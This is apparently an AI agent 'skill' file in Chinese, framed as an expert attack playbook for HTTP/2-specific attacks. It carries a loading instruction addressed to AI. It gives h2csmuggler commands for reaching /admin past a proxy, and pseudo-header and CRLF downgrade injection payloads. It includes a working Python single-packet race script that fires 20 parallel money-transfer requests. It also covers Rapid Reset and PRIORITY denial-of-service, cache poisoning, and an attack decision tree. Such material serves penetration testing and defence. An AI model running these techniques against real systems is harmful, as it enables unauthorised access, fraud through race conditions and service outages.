# 技能：HTTP/2 特定攻击 — 专家攻击手册

> **AI 加载指令**：HTTP/2 协议层级的攻击技术，超越基本的请求走私。涵盖 h2c 走私、伪头部操控、HPACK 攻击、单包竞争条件以及 H2→H1 降级注入。基础模型将 HTTP/2 走私与 HTTP/1.1 走私混淆——此技能专注于 H2-特有的攻击面。

## 0. 相关路由

- [request-smuggling](../request-smuggling/SKILL.md) — CL.TE/TE.CL/TE.TE 基础和 H2.CL/H2.TE 变体
- [request-smuggling/H2_SMUGGLING_VARIANTS.md](../request-smuggling/H2_SMUGGLING_VARIANTS.md) — 字节级 H2.CL/H2.TE 负载、CL.0、客户端不同步
- [race-condition](../race-condition/SKILL.md) — 单包攻击利用 H2 多路复用实现竞争条件
- [web-cache-deception](../web-cache-deception/SKILL.md) — 通过 H2 走私响应进行缓存中毒

---

## 1. HTTP/2 攻击面概述

| 特性 | 攻击面 |
|---|---|
| 二进制帧 | 帧级操控、解析差异 |
| HPACK 压缩 | 压缩预言机（CRIME/BREACH）、表中毒 |
| 多路复用 | 单包竞争条件、RST_STREAM 洪水 |
| 服务器推送 | 通过非请求推送进行缓存中毒 |
| 伪头部（`:method`/`:path`/`:authority`/`:scheme`） | 注入、请求分割、路径差异 |

---

## 2. h2c (HTTP/2 明文) 走私

### 2.1 概念

h2c 是没有 TLS 的 HTTP/2，通过 HTTP/1.1 的 `Upgrade` 机制协商。许多反向代理转发 `Upgrade: h2c` 头部而不理解其含义，允许攻击者绕过代理级别的访问控制。

```
客户端 ──[Upgrade: h2c]──> 反向代理 ──[盲目转发]──> 后端
                                                                    │
                                                            后端使用 H2
                                                            代理对 H2 会话盲
```

### 2.2 攻击流程

```
1. 客户端发送 HTTP/1.1 请求，包含：
   GET / HTTP/1.1
   Host: target.com
   Upgrade: h2c
   HTTP2-Settings: <base64 H2 设置>
   Connection: Upgrade, HTTP2-Settings

2. 代理转发请求（不理解 h2c）
3. 后端响应：HTTP/1.1 101 Switching Protocols
4. 连接现在是客户端和后端之间的 HTTP/2
5. 代理现在是 TCP 隧道——无法检查/过滤 H2 帧
6. 客户端直接向后端发送 H2 请求，绕过代理规则
```

### 2.3 可以绕过的内容

```
✓ 路径访问控制 (/admin 在代理处被阻止 → 通过 h2c 可访问)
✓ WAF 规则（代理端 WAF 无法检查 H2 二进制帧）
✓ 流量限制（代理级流量限制被绕过）
✓ 身份验证（代理强制的身份验证头部）
✓ IP 限制（代理验证源 IP，但 h2c 隧道绕过）
```

### 2.4 工具：h2csmuggler

```bash
# 安装
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install h2

# 基本走私——绕过代理限制访问 /admin
python3 h2csmuggler.py -x https://target.com/ --test

# 走私特定路径
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin/users

# 带自定义头部
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin \
    -H "Authorization: Bearer token123"
```

### 2.5 检测

```bash
# 检查后端是否支持 h2c 升级
curl -v --http1.1 https://target.com/ \
    -H "Upgrade: h2c" \
    -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA" \
    -H "Connection: Upgrade, HTTP2-Settings"

# 101 Switching Protocols → h2c 支持
# 200/400/其他 → h2c 不支持或代理阻止升级
```

---

## 3. 伪头部注入

### 3.1 HTTP/2 伪头部

HTTP/2 用伪头部（以 `:` 开头）替换请求行：

| 伪头部 | HTTP/1.1 等价物 | 示例 |
|---|---|---|
| `:method` | 请求方法 | `GET`, `POST` |
| `:path` | 请求 URI | `/api/users` |
| `:authority` | 主机头部 | `target.com` |
| `:scheme` | 协议 | `https` |

### 3.2 代理和后端之间的路径差异

```
场景：代理基于 :path 路由，后端使用不同的解析

H2 请求：
  :method: GET
  :path: /public/../admin/users
  :authority: target.com

代理看到：/public/../admin/users → 匹配 /public/* 规则 → 允许
后端规范化：/admin/users → 提供管理员内容
```

### 3.3 重复伪头部注入

HTTP/2 规范禁止重复伪头部，但实现各不相同：

```
:method: GET
:path: /public
:path: /admin       ← 重复，规范禁止
:authority: target.com

代理可能使用第一个 :path (/public) 进行路由
后端可能使用最后一个 :path (/admin) 进行服务
```

### 3.4 权限 vs 主机不一致

```
:authority: public.target.com    ← 代理基于此路由
host: admin.internal.target.com  ← 后端可能优先使用 Host 头部

结果：代理路由到 public 虚拟主机，后端提供 admin 虚拟主机
```

### 3.5 方案操控

```
:scheme: https
:path: /api/internal
:authority: target.com

如果后端信任 :scheme 确定请求是否为 "内部":
  :scheme: https → "外部" → 限制
  :scheme: http  → "内部" → 无限制访问
```

---

## 4. HPACK 压缩攻击

### 4.1 HTTP/2 上的 CRIME/BREACH

```
原理：HPACK 压缩头部。如果攻击者控制头部的一部分，且秘密存在于相同的压缩上下文中，匹配猜测 → 更小的帧 → 预言机。

限制：HPACK 使用静态+动态表（不是原始 DEFLATE），按连接表，需要在同一连接上进行许多请求。比原始 CRIME 更难。
```

### 4.2 头部表中毒

```
HPACK 动态表存储同一连接上请求之间的最近头部。
1. 攻击者发送 X-Custom: 恶意值 → 添加到动态表
2. 随后的请求可能引用此条目
3. 如果 CDN/代理池连接 → 攻击者和受害者共享表 → 跨请求泄露
```

---

## 5. 流多路复用滥用

### 5.1 单包攻击（竞争条件）

HTTP/2 多路复用允许在单个 TCP 包中发送多个请求，实现真正的服务器端并行处理：

```
传统竞争条件：发送 N 个请求 → 网络抖动 → 不一致的时间
H2 单包：将 N 个请求打包到一个 TCP 段 → 所有请求同时到达

                    ┌─ 流 1: POST /transfer (amount=1000)
单 TCP 包 ──├─ 流 3: POST /transfer (amount=1000)
                    ├─ 流 5: POST /transfer (amount=1000)
                    └─ 流 7: POST /transfer (amount=1000)
                    
所有 4 个请求在同一纳秒窗口内处理
```

```python
# 使用 h2 库——准备所有请求，单次写入发送
import h2.connection, h2.config, socket, ssl

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = ctx.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)

conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
conn.initiate_connection()
sock.sendall(conn.data_to_send())

for i in range(20):
    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, [(':method','POST'),(':path',path),(':authority',host),(':scheme','https')])
    conn.send_data(sid, b'amount=1000', end_stream=True)

sock.sendall(conn.data_to_send())  # 所有帧在单个 TCP 包中
```

### 5.2 RST_STREAM 洪水（CVE-2023-44487 "快速重置"）

```
攻击：HEADERS (打开流) → RST_STREAM (取消) → 重复每秒数千次
服务器处理每个打开/关闭，但客户端不等待响应
放大：最小的客户端资源 → 巨大的服务器 CPU 消耗
```

### 5.3 PRIORITY 操控

```
在攻击者的流上设置 exclusive=true + weight=256 → 剥夺其他用户的请求
```

---

## 6. HTTP/2 → HTTP/1.1 降级问题

### 6.1 通过二进制格式进行头部注入

H2 头部值是二进制——`\r\n` 在值内是有效数据。当代理降级到 H1 时，值中的 `\r\n` 成为实际换行符 → 头部注入。

```
H2: X-Custom: "value\r\n注入: 恶意"  → 二进制，有效
H1: X-Custom: value                      → 换行符
    注入: 恶意                        → 新头部！
```

### 6.2 转换编码走私

H2 规范禁止 `transfer-encoding`，但某些代理在降级时将其传递 → 后端处理分块编码 → H2.TE 走私。参见 `../request-smuggling/H2_SMUGGLING_VARIANTS.md`。

### 6.3 内容长度差异

H2 使用帧长度（无需 CL）。如果代理在降级时生成 CL，但攻击者也发送了 CL 头部 → 冲突的长度 → 请求走私。

### 6.4 头部名称大小写

H2 要求小写。发送 `Transfer-Encoding`（大写）是无效的 H2，但某些代理将其传递 → 后端上的有效 H1 头部。

---

## 7. 服务器推送缓存中毒

```
攻击：触发服务器推送 /static/app.js 使用攻击者控制的内容
  → PUSH_PROMISE 帧推送恶意响应
  → 浏览器/CDN 缓存中毒内容在合法 URL 下
  → 所有后续加载提供攻击者内容

缓解：大多数现代浏览器/CDN 限制或禁用服务器推送
```

---

## 8. 决策树

```
目标支持 HTTP/2?
│
├── 是
│   ├── 代理支持 h2c 升级?
│   │   ├── 是 → h2c 走私（第 2 节）
│   │   │   └── 绕过代理规则访问受限路径
│   │   └── 否 → 继续
│   │
│   ├── 代理和后端之间 H2→H1 降级?
│   │   ├── 是 → 通过二进制格式进行头部注入（第 6.1 节）
│   │   │   ├── TE 头部传递? → H2.TE 走私（第 6.2 节）
│   │   │   ├── CL 差异? → H2.CL 走私（第 6.3 节）
│   │   │   └── 参见 ../request-smuggling/H2_SMUGGLING_VARIANTS.md
│   │   └── 否（端到端 H2）→ 继续
│   │
│   ├── 需要竞争条件?
│   │   ├── 是 → 通过多路复用进行单包攻击（第 5.1 节）
│   │   │   └── 将 N 个请求打包到单个 TCP 段
│   │   └── 否 → 继续
│   │
│   ├── 伪头部操控可行?
│   │   ├── :path 差异 → 路径混淆（第 3.2 节）
│   │   ├── :authority vs Host → 虚拟主机混淆（第 3.4 节）
│   │   └── :scheme 操控 → 访问控制绕过（第 3.5 节）
│   │
│   ├── 服务器推送启用?
│   │   ├── 是 → 通过推送进行缓存中毒（第 7 节）
│   │   └── 否 → 继续
│   │
│   └── DoS 目标?
│       ├── RST_STREAM 快速重置（第 5.2 节）
│       └── PRIORITY 剥夺（第 5.3 节）
│
└── 否（仅 HTTP/1.1）
    └── 参见 ../request-smuggling/SKILL.md 了解 H1 特定技术
```

---

## 9. 工具参考

| 工具 | 目的 |
|---|---|
| **h2csmuggler** | h2c 升级走私 (github.com/BishopFox/h2csmuggler) |
| **http2smugl** | H2 特定不同步测试 (github.com/neex/http2smugl) |
| **h2 (Python)** | HTTP/2 协议库用于帧构建 (github.com/python-hyper/h2) |
| **nghttp2** | H2 客户端/服务器工具 (nghttp2.org) |
| **Burp HTTP Request Smuggler** | 自动化变体扫描 |
| **curl --http2** | 快速 H2 探测（内置） |

---

## 10. 快速参考

```bash
# h2c 探测
curl -v --http1.1 https://target.com/ -H "Upgrade: h2c" -H "Connection: Upgrade, HTTP2-Settings" -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA"

# H2 支持检查
curl -v --http2 https://target.com/ 2>&1 | grep "ALPN"
```
